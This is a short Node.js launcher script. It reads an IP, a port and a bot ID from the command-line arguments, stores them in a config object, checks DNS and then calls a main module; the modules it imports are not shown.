'use strict';

const BotListener = require('./botListener');
const assert = require('assert');
const Utils = require('./utils');
const main = require('./main');
const config = require('./config');

if (process.argv.length >= 4) {
  const ip = process.argv[2];
  const port = process.argv[3];
  const id = process.argv[4];
  config.globals = {
    botID: id,
    ip: ip,
    homeIP: ip,
    port: port
  };
  Utils.testDNS((err, works) => {
    assert(!err);
    config.globals.dnsWorks = works;
    main(ip, port, id, works);
  });
} else {
  console.log('Invalid arguments');
  console.log(process.argv);
  //main();
}
